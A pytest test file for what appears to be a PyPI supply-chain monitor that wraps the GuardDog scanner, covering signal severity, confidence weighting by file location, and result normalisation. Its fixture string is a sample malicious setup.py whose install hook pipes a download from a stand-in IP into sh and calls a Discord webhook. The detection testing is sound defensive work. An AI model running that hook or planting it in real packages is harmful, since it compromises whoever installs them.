from pathlib import Path

import pytest

from pypi_monitor.analyzers import ReleaseContext
from pypi_monitor.analyzers.guarddog import GuardDogAnalyzer, normalize_results
from pypi_monitor.domain import Severity

# The address is from a documentation range and the file is only ever scanned as text.
MALICIOUS_SETUP = """
import base64, os, urllib.request
from setuptools import setup
from setuptools.command.install import install

class Install(install):
    def run(self):
        os.system("curl http://198.51.100.7/a | sh")
        urllib.request.urlopen("https://discord.com/api/webhooks/1/abc")

setup(name="evil", cmdclass={"install": Install})
"""


def test_guarddog_findings_become_signals(tmp_path: Path) -> None:
    (tmp_path / "evil-1.0").mkdir()
    (tmp_path / "evil-1.0/setup.py").write_text(MALICIOUS_SETUP)
    context = ReleaseContext(name="evil", version="1.0", artifact_dir=tmp_path)

    signals = GuardDogAnalyzer().analyze(context)

    by_rule = {signal.rule_id: signal for signal in signals}
    threat = by_rule["guarddog.install.threat-network-exfil-messenger"]
    assert threat.severity is Severity.HIGH
    assert threat.file_path is not None
    assert threat.file_path.endswith("evil-1.0/setup.py")
    assert threat.line is not None
    assert "discord.com" in threat.evidence
    assert by_rule["guarddog.capability-process-spawn"].severity is Severity.LOW


@pytest.mark.parametrize(
    "path",
    [
        "a.tar.gz/a-1.0/setup.py",
        "a.whl/a/__init__.py",
        "a.tar.gz/a-1.0/a/__init__.py",
        "a.whl/evil.pth",
    ],
)
def test_threats_in_code_that_runs_by_itself_keep_their_weight(path: str, tmp_path: Path) -> None:
    results = {"threat-x": [{"location": f"{path}:1", "message": "m"}]}

    signal = normalize_results(results, {}, tmp_path)[0]

    assert signal.rule_id == "guarddog.install.threat-x"
    assert signal.confidence == pytest.approx(0.7)


@pytest.mark.parametrize("path", ["a.whl/a/cli.py", "a.tar.gz/a-1.0/a/b/c/__init__.py"])
def test_threats_in_ordinary_modules_are_discounted(path: str, tmp_path: Path) -> None:
    results = {"threat-x": [{"location": f"{path}:1", "message": "m"}]}

    signal = normalize_results(results, {}, tmp_path)[0]

    assert signal.rule_id == "guarddog.threat-x"
    assert signal.confidence == pytest.approx(0.14)


def test_clean_code_gives_no_threats(tmp_path: Path) -> None:
    (tmp_path / "module.py").write_text("def add(a, b):\n    return a + b\n")
    context = ReleaseContext(name="ok", version="1.0", artifact_dir=tmp_path)

    assert GuardDogAnalyzer().analyze(context) == []


def test_missing_artifact_is_an_error_not_a_clean_result() -> None:
    with pytest.raises(ValueError, match="no unpacked artifact"):
        GuardDogAnalyzer().analyze(ReleaseContext(name="x", version="1"))


def test_normalization_caps_noisy_rules_and_survives_odd_locations(tmp_path: Path) -> None:
    results = {
        "quiet": {},
        "noisy": [{"location": f"a.py:{i}", "code": "c", "message": "m"} for i in range(1, 50)],
        "odd": [{"location": "no-line", "code": "c", "message": "m"}, {"message": "m"}],
    }

    signals = normalize_results(results, {}, tmp_path)

    assert sum(signal.rule_id == "guarddog.noisy" for signal in signals) == 10
    odd = [signal for signal in signals if signal.rule_id == "guarddog.odd"]
    assert [(s.file_path, s.line) for s in odd] == [("no-line", None), (None, None)]
